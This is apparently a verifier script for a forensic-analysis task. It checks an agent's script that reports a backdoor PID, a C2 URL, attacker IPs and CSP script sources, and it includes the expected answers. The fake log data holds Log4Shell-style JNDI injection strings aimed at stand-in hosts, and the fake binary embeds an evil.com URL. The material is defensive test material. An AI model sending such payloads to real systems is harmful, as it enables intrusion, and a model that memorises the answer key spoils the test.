#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'PY_EOF' > /tmp/test_final_state.py
import os
import secrets
import subprocess
from pathlib import Path

SCRIPT_FILE = Path("/home/user/investigate.sh")
REPORT_FILE = Path("/home/user/report.txt")
INVESTIGATION_DIR = Path("/home/user/investigation")
ARTIFACTS = ["ss_output.txt", "backdoor_bin", "access.log", "csp.txt"]


def run_script():
    assert SCRIPT_FILE.is_file(), f"The analysis script {SCRIPT_FILE} was not created."
    REPORT_FILE.unlink(missing_ok=True)
    subprocess.run(
        ["/bin/bash", str(SCRIPT_FILE)],
        cwd="/home/user",
        check=True,
        timeout=15,
    )
    assert REPORT_FILE.is_file(), f"The report file {REPORT_FILE} was not created by the script."


def read_report():
    data = {}
    with REPORT_FILE.open("r") as f:
        for line in f:
            line = line.strip()
            if not line or "=" not in line:
                continue
            key, val = line.split("=", 1)
            data[key.strip()] = val.strip()
    return data


def assert_report(data, expected):
    for key, value in expected.items():
        assert key in data, f"{key} is missing from the report."
        assert data[key] == value, f"Expected {key} to be {value}, but got {data[key]}."


def write_dynamic_artifacts():
    token = secrets.token_hex(6)
    pid = str(10000 + secrets.randbelow(50000))
    c2_url = f"https://node-{token}.evil.com/payload"

    attacker_ips = [
        f"198.51.100.{10 + secrets.randbelow(80)}",
        f"203.0.113.{100 + secrets.randbelow(80)}",
    ]
    allowed_scripts = [
        f"https://z-{token}.cdn.com",
        f"https://a-{token}.analytics.com",
    ]

    (INVESTIGATION_DIR / "ss_output.txt").write_text(
        "Netid  State   Recv-Q  Send-Q   Local Address:Port    Peer Address:Port  Process\n"
        "tcp    LISTEN  0       128            0.0.0.0:22           0.0.0.0:*      users:((\"sshd\",pid=701,fd=3))\n"
        f"tcp    LISTEN  0       10             0.0.0.0:5555         0.0.0.0:*      users:((\"backdoor\",pid={pid},fd=7))\n"
        "tcp    LISTEN  0       511            0.0.0.0:80           0.0.0.0:*      users:((\"nginx\",pid=702,fd=5))\n"
    )

    (INVESTIGATION_DIR / "backdoor_bin").write_bytes(
        b"\x7fELF\x00random-data\x00" + c2_url.encode() + b"\x00/bin/sh\x00more-data\x00"
    )

    (INVESTIGATION_DIR / "access.log").write_text(
        f'{attacker_ips[1]} - - [11/Oct/2023:10:00:00 +0000] "GET /search?q=${{jndi:ldap://one.example/a}} HTTP/1.1" 404 10\n'
        '10.0.0.9 - - [11/Oct/2023:10:01:00 +0000] "GET /normal HTTP/1.1" 200 20\n'
        f'{attacker_ips[0]} - - [11/Oct/2023:10:02:00 +0000] "POST /api?x=${{jndi:ldap://two.example/b}} HTTP/1.1" 403 30\n'
        f'{attacker_ips[1]} - - [11/Oct/2023:10:03:00 +0000] "GET /again?x=${{jndi:ldap://one.example/c}} HTTP/1.1" 500 40\n'
    )

    (INVESTIGATION_DIR / "csp.txt").write_text(
        "HTTP/1.1 200 OK\n"
        "Server: nginx\n"
        "Content-Security-Policy: default-src 'self'; "
        f"script-src 'self' {allowed_scripts[0]} 'unsafe-inline' {allowed_scripts[1]}; "
        "object-src 'none';\n"
        "Content-Type: text/html\n"
    )

    return {
        "BACKDOOR_PID": pid,
        "C2_URL": c2_url,
        "ATTACKER_IPS": ",".join(sorted(attacker_ips)),
        "ALLOWED_SCRIPTS": ",".join(sorted(allowed_scripts)),
    }


def main():
    assert SCRIPT_FILE.is_file(), f"The analysis script {SCRIPT_FILE} was not created."

    originals = {
        name: (INVESTIGATION_DIR / name).read_bytes()
        for name in ARTIFACTS
    }

    try:
        dynamic_expected = write_dynamic_artifacts()
        run_script()
        assert_report(read_report(), dynamic_expected)
    finally:
        INVESTIGATION_DIR.mkdir(parents=True, exist_ok=True)
        for name, contents in originals.items():
            (INVESTIGATION_DIR / name).write_bytes(contents)

    # Preserve the original verifier's assertions against the supplied artifacts.
    run_script()
    report_data = read_report()

    assert "BACKDOOR_PID" in report_data, "BACKDOOR_PID is missing from the report."
    assert report_data["BACKDOOR_PID"] == "9042", f"Expected BACKDOOR_PID to be 9042, but got {report_data['BACKDOOR_PID']}."

    assert "C2_URL" in report_data, "C2_URL is missing from the report."
    assert report_data["C2_URL"] == "https://c2.evil.com/payload", f"Expected C2_URL to be https://c2.evil.com/payload, but got {report_data['C2_URL']}."

    expected_ips = "203.0.113.45,203.0.113.88"
    assert "ATTACKER_IPS" in report_data, "ATTACKER_IPS is missing from the report."
    assert report_data["ATTACKER_IPS"] == expected_ips, f"Expected ATTACKER_IPS to be {expected_ips}, but got {report_data['ATTACKER_IPS']}."

    expected_scripts = "https://analytics.site.com,https://trusted.cdn.com"
    assert "ALLOWED_SCRIPTS" in report_data, "ALLOWED_SCRIPTS is missing from the report."
    assert report_data["ALLOWED_SCRIPTS"] == expected_scripts, f"Expected ALLOWED_SCRIPTS to be {expected_scripts}, but got {report_data['ALLOWED_SCRIPTS']}."


if __name__ == "__main__":
    main()
PY_EOF

if python3 /tmp/test_final_state.py 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
